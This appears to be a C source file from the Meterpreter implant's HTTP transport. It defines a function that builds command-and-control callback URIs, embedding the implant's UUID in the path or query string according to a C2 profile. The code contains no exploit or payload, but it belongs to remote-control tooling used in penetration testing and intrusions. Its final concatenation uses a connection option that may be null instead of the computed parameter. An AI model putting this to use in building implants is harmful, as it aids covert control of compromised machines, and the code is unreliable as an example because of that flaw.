/*!
 * @file server_http_utils.c
 * @remark HTTP utility function definitions.
 */
#include "metsrv.h"

/*!
 * @brief Generate the correct URI for the given HTTP connection.
 * @param ctx Reference to the \c HttpTransportContext associated with the request.
 * @param HttpConnect Reference to the \c HttpConnection associated with the request.
 * @return Pointer to a wchar_t string containing the URI. Should be freed by the caller.
 * @details This function will steal the UUID from the existing base URI and make sure it
 * is included with any outbound URI that is associated with the request, and hence allows
 * for the URI to change between get and post requests based on a C2 profile.
 */
PWSTR generate_uri(HttpTransportContext* ctx, HttpConnection* conn)
{
	PWCHAR baseUri = ctx->default_options.uri;
	if (conn->options.uri)
	{
		baseUri = conn->options.uri;
	}

	// if we don't have a UUID yet we are going to assume that it's in the base URI.
	// If we do have a URI specified for this connection, we need to parse it. But only
	// if the UUID location parameter is not specified in the cookie/httpheader
	if (!ctx->uuid || conn->options.uuid_cookie || conn->options.uuid_header || ctx->default_options.uuid_cookie || ctx->default_options.uuid_header)
	{
		// return a copy of the baseUri in this case, the caller should free the result.
		return _wcsdup(baseUri);
	}

	PWCHAR getParam = ctx->default_options.uuid_get;
	if (conn->options.uuid_get)
	{
		getParam = conn->options.uuid_get;
	}


	// General form of the URI will be
	// -- /some/uri/(UUID)?some=thing(&param=UUID)
	// The location of the UUID changes depending on what's provided in the configuration

	PWCHAR queryString = wcschr(baseUri, L'?');
	size_t queryStringLen = queryString ? wcslen(queryString) : 0;
	size_t baseUriLen = queryString ? queryString - baseUri : wcslen(baseUri);
	size_t uuidLen = wcslen(ctx->uuid) + 2; // enough space for including slashes if required

	if (getParam)
	{
		queryStringLen += 2 + wcslen(getParam);
	}

	// now let's glue the things together (with NULL terminator)
	size_t uriLen = baseUriLen + queryStringLen + uuidLen + 1;
	PWCHAR uri = (PWCHAR)calloc(uriLen, sizeof(wchar_t));

	wcsncpy_s(uri, uriLen, baseUri, baseUriLen);

	// we put the UUID in the URI if it's not going in the query string
	if (!getParam)
	{
		wcscat_s(uri, uriLen, L"/");
		wcscat_s(uri, uriLen, ctx->uuid);
		wcscat_s(uri, uriLen, L"/");
	}

	// append existing query string, if any
	if (queryString)
	{
		wcscat_s(uri, uriLen, queryString);
	}

	// add the query string paramter if required
	if (getParam)
	{
		wcscat_s(uri, uriLen, queryString ? L"&" : L"?");
		wcscat_s(uri, uriLen, conn->options.uuid_get);
		wcscat_s(uri, uriLen, L"=");
		wcscat_s(uri, uriLen, ctx->uuid);
	}

	dprintf("[GENURI] final URI: %S", uri);

	return uri;
}

